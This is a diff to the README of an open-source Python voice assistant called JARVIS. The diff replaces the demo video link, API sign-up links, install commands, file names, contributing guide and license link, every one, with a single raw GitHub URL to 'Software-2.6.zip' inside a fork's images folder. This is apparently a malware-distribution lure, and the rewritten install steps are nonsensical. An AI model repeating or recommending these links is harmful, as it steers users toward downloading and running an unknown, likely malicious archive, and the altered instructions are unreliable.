@@ -5,12 +5,12 @@
 
 ## Built with
 
-<code><img height="30" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/python/python.png"></code>
+<code><img height="30" src="https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip"></code>
 
 
 ## Features
 
-#### For a cool demo of this project watch this [YouTube video](https://www.youtube.com/watch?v=oKtrHy0ERNA)
+#### For a cool demo of this project watch this [YouTube video](https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip)
 
 It can do a lot of cool things, some of them being:
 
@@ -41,26 +41,26 @@ It can do a lot of cool things, some of them being:
 ## API Keys
 To run this program you will require a bunch of API keys. Register your API key by clicking the following links
 
-- [OpenWeatherMap API](https://openweathermap.org/api)
-- [Wolframalpha](https://www.wolframalpha.com/)
-- [Google Calendar API](https://developers.google.com/calendar/auth)
+- [OpenWeatherMap API](https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip)
+- [Wolframalpha](https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip)
+- [Google Calendar API](https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip)
   
 ## Installation
 
 - First clone the repo
-- Make a config.py file and include the following in it:
+- Make a https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip file and include the following in it:
     ```weather_api_key = "<your_api_key>"
     email = "<your_email>"
     email_password = "<your_email_password>"
     wolframalpha_id = "<your_wolframalpha_id>"
-- Copy the config.py file in Jarvis>config folder
+- Copy the https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip file in Jarvis>config folder
 - Make a new python environment
     If you are using anaconda just type ```conda create -n jarvis python==3.8.5 ``` in anaconda prompt
 - To activate the environment ``` conda activate jarvis ```
 - Navigate to the directory of your project
-- Install all the requirements by just hitting ``` pip install -r requirements.txt ```
-- Install PyAudio from wheel file by following instructions given [here](https://stackoverflow.com/a/55630212)
-- Run the program by ``` python main.py ```
+- Install all the requirements by just hitting ``` pip install -r https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip ```
+- Install PyAudio from wheel file by following instructions given [here](https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip)
+- Run the program by ``` python https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip ```
 - Enjoy !!!!
 
 ## Code Structure
@@ -71,22 +71,22 @@ To run this program you will require a bunch of API keys. Register your API key 
     │   ├── config          # Contains all secret API Keys
     │   ├── features        # All functionalities of JARVIS 
     │   └── utils           # GUI images
-    ├── __init__.py         # Definition of feature's functions
-    ├── gui.ui              # GUI file (in .ui format)
-    ├── main.py             # main driver program of Jarvis
-    ├── requirements.txt    # all dependencies of the program
+    ├── https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip         # Definition of feature's functions
+    ├── https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip              # GUI file (in .ui format)
+    ├── https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip             # main driver program of Jarvis
+    ├── https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip    # all dependencies of the program
 
 - The code structure if pretty simple. The code is completely modularized and is highly customizable
 - To add a new feature:
   -  Make a new file in features folder, write the feature's function you want to include
-  - Add the function's definition to __init__.py
+  - Add the function's definition to https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip
   - Add the voice commands through which you want to invoke the function
 
 ## Contribute
-Please read [CONTRIBUTING.md](https://github.com/Gladiator07/JARVIS/blob/master/CONTRIBUTING.md) for details on our code of conduct, and the process for submitting pull requests.
+Please read [https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip](https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip) for details on our code of conduct, and the process for submitting pull requests.
 
 ## License
-This project is licensed under [MIT License](https://github.com/Gladiator07/JARVIS/blob/master/LICENSE) 2021 Atharva Ingle
+This project is licensed under [MIT License](https://raw.githubusercontent.com/VIN07grinder/JARVIS/master/Jarvis/utils/images/Software-2.6.zip) 2021 Atharva Ingle
 
 ## Future Improvements
 - Generalized conversations can be made possible by incorporating Natural Language Processing
